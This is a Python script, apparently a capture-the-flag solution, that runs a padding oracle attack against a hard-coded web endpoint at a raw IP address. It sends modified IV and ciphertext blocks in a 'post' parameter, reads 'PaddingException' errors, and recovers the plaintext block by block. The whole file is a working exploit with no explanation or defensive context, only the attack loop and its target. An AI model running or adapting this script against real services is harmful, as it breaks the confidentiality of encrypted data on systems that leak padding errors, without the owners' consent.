# Python3
import base64
import requests

def decode(data):
    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))

def encode(data):
    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def bxor(b1, b2): # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result

def test(url, data):
    r = requests.get(url+'?post={}'.format(data))
    if 'PaddingException' in r.text:
        return False
    else:
        return True

def generate_iv_list(tail):
    iv = b'\x00' * (16 - len(tail) -1)
    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]

def padding_oracle(real_iv, url, data):
    index = 15
    plains = bytes()
    tail = bytes()
    while index >= 0:
        for iv in generate_iv_list(tail):
            if test(url, encode(iv+data)):
                plains = bytes([(16-index) ^ iv[index]]) + plains
                index -= 1
                tail = bytes([plain ^ (16-index) for plain in plains])
                break
    return bxor(real_iv, plains)

if __name__ == '__main__':
    post = 'qbMJpeJ64ae9wKo-jQkixuyRhkeB6o7olSr2m!X3FmjCb6qeriqQXp20Rk7wDS13TFVZzImemBUTWcUKFTNuBzhzsWnYUI9aqaCTbsGJxRDAzK6zRBfmLgDo5xs7t!te9WC4nmnfzgG3L3SiOO3M9ZZCDTG3kukM2KG-dTguVJEFcXlRNlWgBSl6k2m-bUA!sgm4jCRThlqVJuRU2awuaQ~~'
    url = 'http://34.94.3.143/4f57c460c6/'

    i = 1
    plains = bytes()
    data = decode(post)
    length = len(data)
    while True:
        if i*16 < length:
            iv = data[(i-1)*16: i*16]
            plains += padding_oracle(iv, url, data[i*16: (i+1)*16])
        else:
            break
        i += 1
        print("current: ", plains)
    print("Final plain Text is:", plains)